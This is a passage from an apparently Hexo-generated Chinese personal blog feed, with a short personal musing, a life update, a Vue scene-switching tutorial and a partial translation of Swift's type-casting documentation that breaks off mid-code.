title="我五年内都不会有女朋友"></a>我五年内都不会有女朋友</h2><blockquote><p>也不会有男朋友。</p></blockquote><p>不是说搬出去住么，又是一周了。与其说没有找到合适的房源，不如说是自己没有找。</p><blockquote><p>我爸问我搬出去是不是因为谈恋爱了。<br>我说不是。<br>然后又问我不去外地实习是不是因为女友在成都。<br>我说不是。<br>我说，我五年内都不会有女朋友，要是有的话我把名字倒着写一个月。</p></blockquote><p>自己渣就别去祸害别人了。</p><p>喝醉了就别到处说出洋相了。</p><p>失恋了就别找异性倾诉，万一别人不喜欢你呢？</p><p>你这是媚俗，是斯德哥尔摩综合征，别人想看就看不想看就不看，你还非要粘着别人不放。<br>拜托，大家都很忙的。</p><hr><p>以上所有内容均为白日呓语。<br>下面才是由衷的：</p><p><strong>想看的看，不想看的就别看</strong></p><p>喵~ 就是这样</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么07-31</title>
      <link href="/2016/07-31-whatsup20160731/"/>
      <url>/2016/07-31-whatsup20160731/</url>
      
        <content type="html"><![CDATA[<p>最近在活</p><hr><h2 id="为什么我要删知乎"><a href="#为什么我要删知乎" class="headerlink" title="为什么我要删知乎"></a>为什么我要删知乎</h2><p>这里指的是删除知乎客户端。知乎现在就是中产阶级民粹集中区，对我的用处已经没有多高了。生活上的问题我可能会单独到浏览器中搜索，但是作为一个客户端，知乎每天推荐给我的都是没用的东西，既不是干货，也不是湿货。现在能在回答区找到回答的概率小之又小。打广告、抖机灵的是第一波，第二波答案是带有强烈主观臆断的，剩下几波是各种「政治正确大于天」、「只有结果不解释」。在这几波之后有幸生还的可能已经忘了点进来的主要目的了。</p><p>引用一个<a href="http://weibo.com/nopingwest" target="_blank" rel="noopener">NoPingWest</a>的引用：  </p><blockquote><p>Quora是“我来教你”<br>知乎是“我给你讲个故事”和“看我逼格突破天际”的二选一  </p></blockquote><blockquote><p>——Twitter. VinkySimon</p></blockquote><p>我会去stackoverflow、segmentfault找技术问题的答案，去数字尾巴、chiphell、engadget、smzdm找各种产品的点评。至少在这两点上，没有打开知乎的意义。</p><hr><h2 id="打算做新的hexo主题了"><a href="#打算做新的hexo主题了" class="headerlink" title="打算做新的hexo主题了"></a>打算做新的hexo主题了</h2><p>初步打算是一个单色的、只用字体、字重、和字体大小区分的内容的主题。很大程度上受到了 Airbnb 手机 App 以及 iOS10 Apple Music 的影响，至于更精细的东西尚待商讨，但是可以预见的是，这个主题做好之后的样式应该和上面说到的两个东西很相似。  </p><p>心路历程看这里：<a href="http://iconmoon.com/blog2/i18n-l10n-in-modern-ui-design/" target="_blank" rel="noopener">图月志 - 「后扁平化时代」的 i18n 和 L10n</a>，<a href="https://medium.com/swarm-nyc/complexion-reduction-a-new-trend-in-mobile-design-cef033a0b978#.4bwjjei5w" target="_blank" rel="noopener">medium - Complexion Reduction: A New Trend In Mobile Design</a></p><p>说了很久要在下班之后干点跟代码有关的东西，这下应该是定了下来了吧？</p><hr><h2 id="换耳机"><a href="#换耳机" class="headerlink" title="换耳机"></a>换耳机</h2><p>日常听歌的耳机坏掉了，这个 cks77 用了大概有一年多。<br><img src="/2016/07-31-whatsup20160731/cks77.jpg" alt=""><br>然后为了日常上下班马上入手了一个小米的圈铁。<br><img src="/2016/07-31-whatsup20160731/mi.jpg" alt=""><br>「买之前我还对小米抱有那么一丝的幻想。」<br>实在忍不下去，昨天晚上充值了信仰，100aap，到手之后我可能会写一篇开箱。</p><hr><p><strong>想看的看，不想看就别看</strong><br><em>就到这里，再见吧！</em></p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>简单的Vue场景转换</title>
      <link href="/2016/07-25-nowclass/"/>
      <url>/2016/07-25-nowclass/</url>
      
        <content type="html"><![CDATA[<p>从实习以来就在使用vue做web app的开发，经常会用到<strong>场景的转换</strong>。</p><p>这一篇我讲讲我现在使用的我认为比较简单的一个方法。</p><p>特别要指出，这里<strong>场景的转换</strong>指的是web app中（资源加载完成后），从引导页面进入主页面或从主页面转到其他页面这个过程。</p><hr><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>这里放一个例子，下面写的都是围绕着这个例子的转换来的。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"intro"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>intro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"outro"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>outro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>首先是<code>intro</code>页，一个文本一个按钮，点击按钮转换至<code>main</code>页面。<br><code>main</code>页面一个按钮，点击按钮转换至<code>outro</code>页面。<br><code>outro</code>页面就只有一个文本。</p><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>刚开始的时候，我给每一个页面的css属性绑定了一个vue的变量，通过对这些变量的值的修改达到目。<br>就像这样：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;introClass&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>intro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"introButtonClick"</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;mainClass&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"mainButtonClick"</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;outroClass&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>outro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>然后在data中为其设置初始值，首先是<code>intro</code>页面，除了它，其他的都会被隐藏：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">new</span> <span class="selector-tag">Vue</span>(&#123;</span><br><span class="line"><span class="attribute">data</span>: &#123;</span><br><span class="line"><span class="string">"introClass"</span>: <span class="string">"intro"</span>,</span><br><span class="line"><span class="string">"mainClass"</span>: <span class="string">"hide"</span>,</span><br><span class="line"><span class="string">"outroClass"</span>: <span class="string">"hide"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>然后在转场的事件触发时，对这三个变量的值进行修改：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">introButtonClick: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.introClass = <span class="string">"hide"</span></span><br><span class="line"><span class="keyword">this</span>.mainClass = <span class="string">"main"</span></span><br><span class="line">...</span><br><span class="line">&#125;,</span><br><span class="line">mainButtonClick: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.mainClass = <span class="string">"hide"</span></span><br><span class="line"><span class="keyword">this</span>.outroClass = <span class="string">"outro"</span></span><br><span class="line">...</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个缺点就太明显：场景一多，就惨了。</p><hr><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>现在用的是这种：<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;nowClass('intro')&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>intro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"introButtonClick"</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;nowClass('main')&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"mainButtonClick"</span>&gt;</span>continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123;nowClass('outro')&#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>outro text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>vue里面就只用记录当前page是哪个就可以了：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">data: &#123;</span><br><span class="line"><span class="string">"currentPage"</span>: <span class="string">"intro"</span>,</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line">methods: &#123;</span><br><span class="line">nowClass: function(page)&#123;</span><br><span class="line">return (page = this.currentPage) ?<span class="built_in"> page </span>: (page + <span class="string">" hide"</span>)</span><br><span class="line">&#125;</span><br><span class="line">introButtonClick: function()&#123;</span><br><span class="line">this.currentPage = <span class="string">"main"</span></span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line">&#125;,</span><br><span class="line">mainButtonClick: function()&#123;</span><br><span class="line">this.currentPage = <span class="string">"outro"</span></span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line">&#125;,</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>其实挺简单的。</p><hr><p>想看的看，不想看的就别看。<br>以上。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「翻译」 Swift 类型转换</title>
      <link href="/2016/07-22-%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
      <url>/2016/07-22-%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p>这是对 swift 2.2 中 <a href="https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/TypeCasting.html#//apple_ref/doc/uid/TP40014097-CH22-ID338" target="_blank" rel="noopener">类型转换</a> 一节的翻译<br>第一次翻译这么长的。。。好麻烦</p><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p><em>类型转换</em>可以判断实例的类型，也可以将该实例在其所在的类层次中视为其父类或子类的实例。</p><p>Swift 中的类型转换使用 <code>is</code> 和 <code>as</code> 作为操作符。这两个操作符使用了一种简单传神的方式来检查一个值的类型或将某个值转换为另一种类型。</p><p>你还可以使用类型转换来检查类型是否符合一个协议，参考<a href="">协议实现的检查</a>。</p><h1 id="为类型转换定义类层次"><a href="#为类型转换定义类层次" class="headerlink" title="为类型转换定义类层次"></a>为类型转换定义类层次</h1><p>你可以在类及其子类层次中使用类型转换判断特定类实例的类型，或在同一类层次中将该实例类型转换为另一类型。下面的三段代码定义了一个类层次以及一个包含了这些类实例的数组，作为类型转换的例子。</p><p>第一个代码片段定义了一个叫做 <code>MediaItem</code> 的新类。这个类为出现在数字媒体库中的所有成员提供了基本的功能。它申明了一个 <code>String</code> 类型的 <code>name</code> 和一个叫做 <code>init</code> 的 <code>name</code> 生成化器（这里假设所有的媒体项目，包括所有电影和音乐，都有一个名字）。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MediaItem</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name: <span class="type">String</span></span><br><span class="line">    <span class="keyword">init</span>(name: <span class="type">String</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.name = name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一个片段定义了两个 <code>MediaItem</code> 的子类。第一个子类 <code>Movie</code> 封装了电影的信息。他在 <code>MediaItem</code> 的基础上添加了名为 <code>director</code> 的属性及其生成化器。第二个子类 <code>Song</code> 增加了名为 <code>artist</code> 的属性及其生成化器。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Movie</span>: <span class="title">MediaItem</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> director: <span class="type">String</span></span><br><span class="line">    <span class="keyword">init</span>(name: <span class="type">String</span>, director: <span class="type">String</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.director = director</span><br><span class="line">        <span class="keyword">super</span>.<span class="keyword">init</span>(name: name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span>: <span class="title">MediaItem</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> artist: <span class="type">String</span></span><br><span class="line">    <span class="keyword">init</span>(name: <span class="type">String</span>, artist: <span class="type">String</span>) &#123;</span><br><span class="line">        <span class="keyword">self</span>.artist = artist</span><br><span class="line">        <span class="keyword">super</span>.<span class="keyword">init</span>(name: name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个代码段创建了名为 <code>library</code> 的数组常量，其中包含了两个 <code>Movie</code> 和三个 <code>Song</code> 实例。<code>library</code> 数组的类型是在初始化时根据其中内容推断出来的。 Swift 的类型检查器能够推断 <code>Movie</code> 和 <code>Song</code> 有一个共同的父类 <code>MediaItem</code>， 因此 <code>library</code> 的类型推断为 <code>[MediaItem]</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> library = [</span><br><span class="line">    <span class="type">Movie</span>(name: <span class="string">"Casablanca"</span>, director: <span class="string">"Michael Curtiz"</span>),</span><br><span class="line">    <span class="type">Song</span>(name: <span class="string">"Blue Suede Shoes"</span>, artist: <span class="string">"Elvis Presley"</span>),</span><br><span class="line">    <span class="type">Movie</span>(name: <span class="string">"Citizen Kane"</span>, director: <span class="string">"Orson Welles"</span>),</span><br><span class="line">    <span class="type">Song</span>(name: <span class="string">"The One And Only"</span>, artist: <span class="string">"Chesney Hawkes"</span>),</span><br><span class="line">    <span class="type">Song</span>(name: <span class="string">"Never Gonna Give You Up"</span>, artist: <span class="string">"Rick Astley"</span>)</span><br><span class="line">]</span><br><span class="line"><span class="comment">// the type of "library" is inferred to be [MediaItem]</span></span><br></pre></td></tr></table></figure><p>事实上 <code>library</code> 储存的项目依旧是 <code>Movie</code> 和 <code>Song</code> 实例。然而，如果你遍历这个数组的内容，你取出的项目将会是 <code>MediaItem</code> 类型而非 <code>Movie</code> 或 <code>Song</code> 类型。为了使用他们原生的类型，你需要<em>检查</em>他们的类型或将他们<em>向下转换</em>为不同的类型，如下所述。</p><h1 id="检查类型"><a href="#检查类型" class="headerlink" title="检查类型"></a>检查类型</h1><p>使用<em>类型检查操作符</em> <code>is</code> 来检查一个实例是否属于一个特定的子类。如果实例属于该子类，类型检查操作符返回 <code>true</code>，否则返回 <code>false</code>。</p><p>下面的例子定义了两个变量，<code>movieCount</code> 和 <code>songCount</code>，用来计算数组 <code>library</code> 中 <code>Movie</code> 和 <code>Song</code> 实例的个数：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> movieCount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> songCount = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> library &#123;</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">is</span> <span class="type">Movie</span> &#123;</span><br><span class="line">        movieCount += <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> item <span class="keyword">is</span> <span class="type">Song</span> &#123;</span><br><span class="line">        songCount += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Media library contains \(movieCount) movies and \(songCount) songs"</span>)</span><br><span class="line"><span class="comment">// Prints "Media library contains 2 movies and 3 songs</span></span><br></pre></td></tr></table></figure><p>这个例子遍历了整个 <code>library</code> 数组。每一轮中，<code>for-in</code> 的循环都将 <code>item</code> 设置为数组中的当前 <code>MediaItem</code>。</p><p>如果当前 <code>MediaItem</code> 是 <code>Movie</code> 类型的实例，<code>item is Movie</code> 返回 <code>true</code>，反之返回 <code>false</code>。同样的，<code>item is Song</code> 检查了该对象是否为 <code>Song</code> 类型的实例。在 <code>for-in</code> 循环的最后，<code>movieCount</code> 和 <code>songCount</code> 的值就是数组中对应类型实例的数量。</p><h1 id="向下类型转换"><a href="#向下类型转换" class="headerlink" title="向下类型转换"></a>向下类型转换</h1><p>某个类型的常量或变量可能引用自一个子类的实例。当你遇到这种情况时你可以尝试使用<em>类型转换操作符</em>（<code>as?</code> 或 <code>as!</code>）将它<em>向下转换类型</em>至其子类型。</p><p>由于向下类型转换有可能失败，类型转换操作符有两个不同形式。条件形式 <code>as?</code> 返回了一个包含你将要向下转换类型的可选类型。强制形式 <code>as!</code> 则将向下转换和强制解包结合为一个步骤。</p><p>如果你不确定你向下转换类型是否成功，请使用条件形式的类型转换操作符 <code>as?</code>。使用条件形式的类型转换操作符总是返回一个可选类型，如果向下转换失败，可选值为 <code>nil</code>。可以使用这种方法检查向下类型转换是否成功。</p><p>当你确信向下转换类型会成功时，请使用强制形式的类型转换操作符 <code>as!</code>。当你向下转换至一个错误的类型时，强制形式的类型转换操作符会触发一个运行错误。</p><p>下面的例子遍历了 <code>library</code> 中所有的 <code>MediaItem</code>，并打印出相应的描述信息。要这样做的话，每个项目均需要被当做 <code>Movie</code> 或 <code>Song</code> 类型来访问，而不仅仅是 <code>MediaItem</code> 类型。为了在描述信息中使用 <code>Movie</code> 或 <code>Song</code> 的 <code>director</code> 和 <code>artist</code> 属性，这样做是必要的。</p><p>在这个例子中，数组中每一个项目的类型都是 <code>Movie</code> 或 <code>Song</code>。你不知道遍历时项目的确切类型是什么，所以这时使用条件形式的类型转换符（<code>as?</code>）来检查遍历中每次向下类型转换：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> library &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> movie = item <span class="keyword">as</span>? <span class="type">Movie</span> &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Movie: '\(movie.name)', dir. \(movie.director)"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="keyword">let</span> song = item <span class="keyword">as</span>? <span class="type">Song</span> &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Song: '\(song.name)', by \(song.artist)"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Movie: 'Casablanca', dir. Michael Curtiz</span></span><br><span class="line"><span class="comment">// Song: 'Blue Suede Shoes', by Elvis Presley</span></span><br><span class="line"><span class="comment">// Movie: 'Citizen Kane', dir. Orson Welles</span></span><br><span class="line"><span class="comment">// Song: 'The One And Only', by Chesney Hawkes</span></span><br><span class="line"><span class="comment">// Song: 'Never Gonna Give You Up', by Rick Astley</span></span><br></pre></td></tr></table></figure><p>例子开头尝试将当前 <code>item</code> 当做 <code>Movie</code> 向下转换类型。由于 <code>item</code> 是一个 <code>MediaItem</code> 的实例，它<em>有可能</em>属于 <code>Movie</code> 类型；同样的，也有可能属于 <code>Song</code> 或者仅仅属于 <code>MediaItem</code> 基类。介于这种不确定性，类型转换符 <code>as?</code> 在向下转换类型时返回了一个可选项。<code>item as? Movie</code> 的结果是 <code>Movie?</code> 类型，也就是『可选 <code>Movie</code> 类型』。</p><p>当数组中的 <code>Song</code> 实例使用向下转换至 <code>Movie</code> 类型时会失败。为了处理这种情况，上面的例子使用了可选绑定来检查可选 <code>Movie</code> 类型是否包含了一个值（或者说检查向下类型转换是否成功）。这个可选绑定写作『<code>if let movie = item as? Movie</code>』，读作『尝试将 <code>item</code> 转换至 <code>Movie</code> 类型。如果成功，设置一个新的临时常量 <code>movie</code> 储存返回的可选 <code>Movie</code> 类型 』。</p><p>如果向下转换类型成功，<code>movie</code> 的属性将用于输出 <code>Movie</code> 实例的描述信息，包括<code>director</code> 的名字。同理，无论是否在数组中找到 <code>Song</code> ，均可以检查 <code>Song</code> 实例然后输出合适的描述（包括 <code>artist</code> 的名字）。</p><blockquote><p><code>注意</code><br>类型转换不会改变实例及其值。基本的实例不会改变；只是将它当做其转换的类型来访问。</p></blockquote><h1 id="Any-和-AnyObject-的类型转换"><a href="#Any-和-AnyObject-的类型转换" class="headerlink" title="Any 和 AnyObject 的类型转换"></a>Any 和 AnyObject 的类型转换</h1><p>Swift 为不确定的类型提供了两种特殊的类型别名：</p><ul><li><code>AnyObject</code> 可以表示任何类类型的实例。</li><li><code>Any</code> 可以表示任何类型，包括函数类型。</li></ul><blockquote><p><code>注意</code><br>当你确切需要使用一个功能时再使用 <code>Any</code> 和 <code>AnyObject</code>。在写代码时使用更加明确的类型表达总要好一些。</p></blockquote><h1 id="AnyObject-类型"><a href="#AnyObject-类型" class="headerlink" title="AnyObject 类型"></a>AnyObject 类型</h1><p>使用 Cocoa APIs 时，你有时会接收到 <code>[AnyObject]</code> 类型的数组，也就是『由任意类型对象构成的数组』。目前 Objective-C 支持显式类型的数组，但是旧版本的语言没有这个功能。然而你仍可以确信这种提供 API 信息的数组中包含的对象的类型。</p><p>在这种情况中，你可以使用强制类型转换符（<code>as!</code>）将数组中的项目向下转换至比 <code>AnyObject</code> 更明确的类型，而无需将可选类型解包。</p><p>下面的例子定义了一个 [AnyObject] 类型的数组，并实例化了三个 <code>Movie</code> 类：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> someObjects: [<span class="type">AnyObject</span>] = [</span><br><span class="line">    <span class="type">Movie</span>(name: <span class="string">"2001: A Space Odyssey"</span>, director: <span class="string">"Stanley Kubrick"</span>),</span><br><span class="line">    <span class="type">Movie</span>(name: <span class="string">"Moon"</span>, director: <span class="string">"Duncan Jones"</span>),</span><br><span class="line">    <span class="type">Movie</span>(name: <span class="string">"Alien"</span>, director: <span class="string">"Ridley Scott"</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>由于我们已知这个数组只包含了 <code>Movie</code> 实例，你可以直接使用强制类型的类型转换符（<code>as!</code>）将其向下转换至非可选的 <code>Movie</code> 类型：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> object <span class="keyword">in</span> someObjects &#123;</span><br><span class="line">    <span class="keyword">let</span> movie = object <span class="keyword">as</span>! <span class="type">Movie</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Movie: '\(movie.name)', dir. \(movie.director)"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Movie: '2001: A Space Odyssey', dir. Stanley Kubrick</span></span><br><span class="line"><span class="comment">// Movie: 'Moon', dir. Duncan Jones</span></span><br><span class="line"><span class="comment">// Movie: 'Alien', dir. Ridley Scott</span></span><br></pre></td></tr></table></figure><p>在这个循环中，直接将 <code>someObject</code> 向下转换为 <code>[Movie]</code> 类型而非挨个向下转换，可以使代码更短：</p><figure class="highlight swift"><table><tr><td 